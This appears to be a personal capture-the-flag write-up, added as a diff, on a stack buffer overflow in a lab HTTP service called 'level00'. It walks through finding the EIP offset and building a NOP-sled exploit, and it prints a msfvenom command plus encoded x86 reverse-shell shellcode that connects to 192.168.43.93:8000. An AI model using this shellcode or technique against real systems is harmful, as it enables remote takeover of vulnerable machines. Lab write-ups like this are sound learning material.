@@ -1,0 +1,78 @@
+Buffer overflow in:
+```
+strcpy(path, resolved);
+```
+
+Hint says to put the shellcode after the HTTP/1.1, which makes sense.
+
+We must have the path be over 128 chars to overflow it.
+
+I wanted to debug it with r2 so I started a gdbserver
+
+gdbserver --attach :22222 1232
+But I suck at debugging so I wasn't able to see what's going on
+
+
+I created a segfault by putting 300 'A' characters in the path.
+
+I managed to see the segfault using:
+dmesg | tail -n 1
+
+Result:
+[ 8741.877485] level00[3032]: segfault at 41414141 ip 41414141 sp bfb55760 error 14
+
+
+I used a pattern to find the amount of chars I needed to overwrite:
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
+
+Result:
+[ 9260.080332] level00[3076]: segfault at 65413665 ip 65413665 sp bfb55760 error 14
+
+Hex to ascii:
+65413665 = eA6e
+
+Because of little endian, what we need is Ae6.
+
+I determined that I need 143 chars (139 + 4) to overwrite the EIP.
+path = 139*'A' + 'BBBB' // EIP gets overwritten to 0x42424242
+
+We have spent 4 bytes (GET ) + 144 bytes (overwrite EIP + 1 space) + 8 bytes (protocol) = 156 bytes so far. That means we have 868 bytes left for our shellcode (if we choose to keep the shellcode contained in the buffer). 
+
+
+We can't have . or / in the payload because of the fix_path function.
+
+I generated a payload using msfvenom:
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.43.93 LPORT=8000 -a x86 --platform linux -b '\x00\x2f' -f python
+
+Output: 
+```
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 95 (iteration=0)
+x86/shikata_ga_nai chosen with final size 95
+Payload size: 95 bytes
+Final size of python file: 479 bytes
+buf =  b""
+buf += b"\xbf\xc2\x14\x5e\x38\xdb\xc6\xd9\x74\x24\xf4\x58\x29"
+buf += b"\xc9\xb1\x12\x83\xe8\xfc\x31\x78\x0e\x03\xba\x1a\xbc"
+buf += b"\xcd\x0b\xf8\xb7\xcd\x38\xbd\x64\x78\xbc\xc8\x6a\xcc"
+buf += b"\xa6\x07\xec\xbe\x7f\x28\xd2\x0d\xff\x01\x54\x77\x97"
+buf += b"\x51\x0e\xac\x3a\x3a\x4d\xb3\xdb\xfa\xd8\x52\x53\x9c"
+buf += b"\x8a\xc5\xc0\xd2\x28\x6f\x07\xd9\xaf\x3d\xaf\x8c\x80"
+buf += b"\xb2\x47\x39\xf0\x1b\xf5\xd0\x87\x87\xab\x71\x11\xa6"
+buf += b"\xfb\x7d\xec\xa9"
+```
+
+
+received "[debug] buffer is at 0xbfb55778 :-)
+
+I'm going to add 300 bytes of NOPs after the HTTP/1.1, and then the shellcode.
+
+I'm going to set the new address to the base address of the buffer, + len(mode) + len(path) + len(protocol) + len(nopsled) / 2
+that's 304 extra bytes = 0x130
+
+0xbfb55778 + 0x130 = 0xBFB558A8
+
+
+And it worked! I got a reverse shell! YAY!
+
